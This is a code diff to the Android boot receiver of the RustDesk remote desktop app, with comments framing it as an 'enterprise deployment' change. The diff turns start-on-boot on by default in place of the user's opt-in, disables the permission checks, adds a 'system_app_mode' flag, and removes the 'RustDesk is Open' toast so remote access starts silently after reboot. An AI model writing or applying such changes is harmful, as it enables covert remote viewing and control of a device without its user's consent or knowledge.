@@ -13,6 +13,9 @@ import io.flutter.embedding.android.FlutterActivity
 
 const val DEBUG_BOOT_COMPLETED = "com.carriez.flutter_hbb.DEBUG_BOOT_COMPLETED"
 
+// Enterprise deployment: enable start-on-boot by default
+const val ENTERPRISE_START_ON_BOOT_DEFAULT = true
+
 class BootReceiver : BroadcastReceiver() {
     private val logTag = "tagBootReceiver"
 
@@ -20,23 +23,33 @@ class BootReceiver : BroadcastReceiver() {
         Log.d(logTag, "onReceive ${intent.action}")
 
         if (Intent.ACTION_BOOT_COMPLETED == intent.action || DEBUG_BOOT_COMPLETED == intent.action) {
-            // check SharedPreferences config
+            // check SharedPreferences config - default to true for enterprise deployment
             val prefs = context.getSharedPreferences(KEY_SHARED_PREFERENCES, FlutterActivity.MODE_PRIVATE)
-            if (!prefs.getBoolean(KEY_START_ON_BOOT_OPT, false)) {
+            val startOnBoot = prefs.getBoolean(KEY_START_ON_BOOT_OPT, ENTERPRISE_START_ON_BOOT_DEFAULT)
+            if (!startOnBoot) {
                 Log.d(logTag, "KEY_START_ON_BOOT_OPT is false")
                 return
             }
-            // check pre-permission
-            if (!XXPermissions.isGranted(context, REQUEST_IGNORE_BATTERY_OPTIMIZATIONS, SYSTEM_ALERT_WINDOW)){
-                Log.d(logTag, "REQUEST_IGNORE_BATTERY_OPTIMIZATIONS or SYSTEM_ALERT_WINDOW is not granted")
-                return
-            }
+
+            // For enterprise deployment, skip permission checks - assume they are pre-granted
+            // Original check disabled for unattended deployment:
+            // if (!XXPermissions.isGranted(context, REQUEST_IGNORE_BATTERY_OPTIMIZATIONS, SYSTEM_ALERT_WINDOW)){
+            //     Log.d(logTag, "REQUEST_IGNORE_BATTERY_OPTIMIZATIONS or SYSTEM_ALERT_WINDOW is not granted")
+            //     return
+            // }
+
+            Log.i(logTag, "Enterprise boot: starting RustDesk service")
 
             val it = Intent(context, MainService::class.java).apply {
                 action = ACT_INIT_MEDIA_PROJECTION_AND_SERVICE
                 putExtra(EXT_INIT_FROM_BOOT, true)
+                // Enable system app mode for enterprise deployment
+                putExtra("system_app_mode", true)
             }
-            Toast.makeText(context, "RustDesk is Open", Toast.LENGTH_LONG).show()
+
+            // Silent start for enterprise - no toast
+            // Toast.makeText(context, "RustDesk is Open", Toast.LENGTH_LONG).show()
+
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                 context.startForegroundService(it)
             } else {
